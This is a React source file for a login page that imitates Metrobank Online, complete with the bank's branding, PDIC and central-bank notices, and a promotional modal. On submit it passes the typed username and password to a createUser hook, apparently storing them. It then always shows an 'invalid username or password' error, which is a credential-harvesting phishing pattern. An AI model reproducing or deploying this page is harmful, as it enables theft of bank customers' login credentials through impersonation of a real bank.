import { useState, useEffect } from "react";
import { User, Lock, CircleAlert } from "lucide-react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEye } from "@fortawesome/free-solid-svg-icons";
import { motion } from "framer-motion";
import desktop from "../assets/login/desktop.png";
import name from "../assets/login/name.png";
import mobile from "../assets/login/mobile.webp";
import PDIC from "../assets/login/PDIC.svg";
import modal from "../assets/login/loginmodal.webp";

import useUsers from "../hooks/useUsers";

export default function Login() {
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [showModal, setShowModal] = useState(false);
  const [usernameFocus, setUsernameFocus] = useState(false);
  const [passwordFocus, setPasswordFocus] = useState(false);

  const [bgImage, setBgImage] = useState(mobile); // default to mobile
  const [InvalidCredentials, setInvalidCredentials] = useState(false);

  const { createUser, loading } = useUsers();

  useEffect(() => {
    const handleResize = () => {
      if (window.innerWidth >= 600) {
        setBgImage(desktop); // your desktop image
      } else {
        setBgImage(mobile);
      }
    };

    handleResize(); // check on mount
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  useEffect(() => {
    // show modal on first visit unless user opted out
    const hideModal = localStorage.getItem("hideMetrobankModal");
    if (!hideModal) {
      setShowModal(true);
    }
  }, []);
  const handleCloseModal = () => setShowModal(false);
  const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.checked) {
      localStorage.setItem("hideMetrobankModal", "true");
    } else {
      localStorage.removeItem("hideMetrobankModal");
    }
  };

  const handleSubmit = () => {
    handleAddUser();
  };

  const handleAddUser = async () => {
    if (!username || !password) return;
    await createUser({ username: username, password: password });
    setInvalidCredentials(true);
    setTimeout(() => setInvalidCredentials(false), 5000);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center relative overflow-hidden bg-contain bg-no-repeat bg-bottom"
      style={{ backgroundImage: `url(${bgImage})` }}
    >
      {/* Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-sm shadow-lg w-[78vw] h-[555px] max-w-[585px] sm:h-[620px] relative">
            <button
              className="absolute  top-0 right-0 text-white text-xl px-4.5 py-3 m-2 bg-[#807C7CCC] z-51 rounded-full cursor-pointer"
              onClick={handleCloseModal}
              title="close"
            >
              ✕
            </button>
            <div className="overflow-y-auto relative h-full flex flex-col">
              <div
                className="bg-white shadow-lg p-6 min-h-[180px]  w-full sm:min-h-[350px] relative bg-cover bg-no-repeat"
                style={{ backgroundImage: `url(${modal})` }}
              ></div>

              <h2 className="bg-[#005EA6] text-[16px] font-bold text-white text-center p-[10px] sm:text-[21px]">
                Do more on Metrobank Online!
              </h2>
              <div className="p-4 md:p-5 lg:pt-7 leading-tight">
                <div className="flex min-h-[44px] md:h-[60px] justify-center gap-2 sm:gap-4 flex-wrap">
                  <img
                    src="/icon/1.png"
                    alt="paperAirplane"
                    className="h-10 sm:h-15"
                  />
                  <img
                    src="/icon/2.png"
                    alt="reciept"
                    className="h-10 sm:h-15"
                  />
                  <img
                    src="/icon/3.png"
                    alt="timeIsMoney"
                    className="h-10 sm:h-15"
                  />
                  <img
                    src="/icon/4.png"
                    alt="appMoney"
                    className="h-10 sm:h-15"
                  />
                  <img
                    src="/icon/5.png"
                    alt="tradeMoney"
                    className="h-10 sm:h-15"
                  />
                </div>
                <p className=" text-center mt-4 text-sm">
                  Send money, pay bills, invest, buy prepaid load, and transfer
                  funds.
                </p>
                <p className="text-sm text-center mt-4">
                  We can help you whether you are<br></br>a new user, signing
                  up, or you want to upgrade from Metrobankdirect <br></br>
                  Personal.
                </p>
                <div className="flex justify-center text-sm gap-2 sm:gap-12 md:gap-20 pt-2 sm:m-4">
                  <div className="flex flex-1 justify-center px-4">
                    <button className="bg-[#126EBD] text-white p-2.5 m-[5px] rounded-lg text-[13px] shadow-[0_1px_5px_0_rgba(0,0,0,0.2),0_2px_2px_0_rgba(0,0,0,0.14),0_3px_1px_-2px_rgba(0,0,0,0.12)]">
                      Help me sign up
                    </button>
                  </div>
                  <div className="flex flex-1 justify-center px-4">
                    <button className="bg-[#126EBD] text-white p-2.5 rounded-lg m-[5px] text-[13px] shadow-[0_1px_5px_0_rgba(0,0,0,0.2),0_2px_2px_0_rgba(0,0,0,0.14),0_3px_1px_-2px_rgba(0,0,0,0.12)]">
                      Help me upgrade
                    </button>
                  </div>
                </div>
                <div className="relative md:mt-10 sm:mt-7">
                  <label className="flex items-center text-sm  pt-2 pointer mr-3.5 md:left-0 md:bottom-0">
                    <input
                      type="checkbox"
                      onChange={handleCheckboxChange}
                      className="w-[18px] h-[18px] m-2.5 focus:ring-blue-900 cursor-pointer"
                    />
                    Do not show this next time
                  </label>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.3, ease: "easeOut" }}
        className=" flex flex-col justify-center items-center text-center mt-[-10vh]"
      >
        {/* Title */}
        <h1 className="font-myriad text-[28.8px] sm:text-[48px] lg:text-[64px] xl:text-[80px] font-bold  warp text-blue-900 mb-6 sm:mb-1 cursor-default">
          You're in good hands
        </h1>

        {/* Login Card */}
        {/* Replace the login card div with this - SAME CSS */}
        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSubmit();
          }}
          className="bg-[#e7e5e6] shadow-[0_3px_8px_rgba(0,0,0,0.08)] rounded-xl w-[320px] p-4 z-10"
        >
          {/* Logo */}
          <div className="flex justify-center">
            <img src={`${name}`} alt="Logo" className="h-7" />
          </div>

          {/* Username */}
          <div className="  ">
            <div className="flex items-center py-2">
              <User size={24} className="text-gray-400 mr-2" />
              <div className="w-full">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onBlur={() => setUsernameFocus(true)}
                  className={`outline-none w-full border-b-1 hover:border-b-2 bg-transparent text-[0.9rem] pt-[6px] pb-[7px] 
          focus:border-b-2 placeholder:font-medium placeholder:text-gray-400
          ${
            usernameFocus && username === ""
              ? "border-[#f44336] border-b-2"
              : "border-gray-400 focus:border-blue-900"
          }`}
                  placeholder="Username"
                />
                {usernameFocus && username === "" && (
                  <p className="text-red-500 text-xs mt-1 text-left">
                    Please enter your username.
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Password */}
          <div className="mb-4">
            <div className="flex items-center">
              <Lock size={24} className="text-gray-400 mr-2" />
              <div className="w-full">
                <div className="w-full relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onBlur={() => setPasswordFocus(true)}
                    className={`outline-none w-full bg-transparent text-sm placeholder:font-medium placeholder:text-gray-400 border-b-1 hover:border-b-2 focus:border-b-2 py-[6px]
            ${passwordFocus && password === "" ? "border-b-2 border-red-500" : "border-gray-400 focus:border-blue-900"}`}
                    placeholder="Password"
                  />
                  <motion.button
                    type="button"
                    title={`${showPassword ? "hide" : "show"} `}
                    className={`outline-none absolute rounded-full py-2 px-3 top-0 right-0 ${showPassword ? "text-blue-900" : "text-gray-400"} cursor-pointer`}
                    whileHover={{
                      background: "rgba(0, 0, 0, 0.26)",
                    }}
                    whileFocus={{ background: "rgba(0, 0, 0, 0.26)" }}
                    whileTap={{
                      background: "rgba(0, 0, 0, 0.26)",
                      scale: 1.15,
                    }}
                    transition={{ type: "spring", stiffness: 100 }}
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    <FontAwesomeIcon icon={faEye} />
                  </motion.button>
                </div>
                {passwordFocus && password === "" && (
                  <p className="text-red-500 text-xs mt-1 text-left">
                    Please enter your password.
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Login Button - ONLY changed type="submit" */}
          <button
            type="submit"
            className={`w-full text-4 py-2 rounded-lg flex justify-center items-center ${
              username != "" && password != ""
                ? "bg-[#001a88] text-white shadow-[0_1px_5px_0px_rgba(0,0,0,0.2),0_2px_2px_0px_rgba(0,0,0,0.14),0_3px_1px_-2px_rgba(0,0,0,0.12)]"
                : "bg-[#cacaca] text-gray-400"
            }`}
            disabled={username == "" || password == ""} // Fixed logic
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            ) : (
              "Login"
            )}
          </button>

          {/* Links - outside form to avoid submit */}
          <div className="flex justify-between mt-1 font-bold text-blue-900 text-[12.8px] py-1 border-b-1 border-gray-400/50">
            <a href="/signup">Sign up</a>
            <a href="/recoveraccess">Recover access</a>
          </div>

          <div className="text-center my-4 text-[12.8px] text-[#808080] ">
            Lost your device?{" "}
            <a href="blockyouraccount" className="text-blue-900 font-bold">
              Block your account
            </a>
          </div>
        </form>
      </motion.div>
      {/* Decorative gradient bottom */}
      <div className="absolute bottom-6  bg-cover flex items-center justify-center px-4">
        <div className="flex items-center justify-center gap-2">
          <img src={PDIC} alt="PDIC" />
          <p className="text-white text-[10.4px] pr-9 sm:pr-0 sm:text-[11.2px] lg:text-[12.8px] my-[10.4px] max-w-120 leading-tight">
            Deposits are insured by PDIC up to P1 Million per depositor.
            Metrobank is a proud member of BancNet. Metrobank is regulated by
            Bangko Sentral ng Pilipinas.
          </p>
        </div>
      </div>
      {InvalidCredentials && (
        <div className="absolute bottom-4 flex bg-red-400 text-white gap-5 p-3.5 w-[95vw] md:w-140">
          <div className="flex justify-center items-center ">
            <CircleAlert size={25} />
          </div>
          <div className=" flex-1">
            <span className="text-[14.5px] text-wrap mr-7">
              You have entered an invalid username or password. Please try
              again.
            </span>
          </div>
          <div className="flex justify-center items-center">
            <span className="text-[8.5px] rounded-full px-2 py-1 -mr-1 hover:bg-black/24 cursor-pointer">
              ✕
            </span>
          </div>
        </div>
      )}
    </div>
  );
}
